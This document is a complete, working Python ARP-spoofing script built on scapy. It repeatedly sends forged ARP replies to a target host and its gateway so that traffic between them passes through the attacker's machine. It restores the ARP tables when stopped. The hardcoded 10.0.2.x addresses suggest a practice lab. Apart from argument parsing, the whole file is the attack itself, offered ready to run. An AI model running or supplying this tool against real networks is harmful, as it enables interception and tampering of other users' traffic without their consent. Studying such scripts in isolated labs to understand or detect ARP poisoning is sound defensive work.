import scapy.all as scapy
import argparse
import time


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', dest='target',
                        help='Target IP / IP range.')

    parser.add_argument('-g', '--gateway', dest='gateway',
                        help='Gateway IP address.')

    options = parser.parse_args()
    if not options.target:
        parser.error(
            '[-] Please specify a Target IP, use --help for more info.')
    if not options.gateway:
        parser.error(
            '[-] Please specify a Gateway IP, use --help for more info.')

    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    dst = 'ff:ff:ff:ff:ff:ff'
    broadcast = scapy.Ether(dst=dst)
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(
        arp_request_broadcast, timeout=1, verbose=False)[0]

    try:
        res = answered_list[0][1].hwsrc
    except IndexError:
        print('Failed ARP')
        print(answered_list)
    return res


def spoof(target_ip, spoof_ip):

    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)
    # print(packet.show())
    # print(packet.summary())


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2,
                       pdst=destination_ip,
                       hwdst=destination_mac,
                       psrc=source_ip,
                       hwsrc=source_mac
                       )
    scapy.send(packet, count=4, verbose=False)
    # print(packet.show())
    # print(packet.summary())


if __name__ == '__main__':

    target_ip = '10.0.2.10'
    gateway_ip = '10.0.2.1'

    # options = get_arguments()
    # target_ip = options.target
    # gateway_ip = options.gateway

    try:
        sent_packets_count = 0
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count += 2

            print(f'\r[+] Packets sent: {sent_packets_count}', end='')

            time.sleep(2)
    except KeyboardInterrupt:
        print('\r[+] Detected CTRL + C ..... Resetting ARP tables ..... Please wait.')

        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
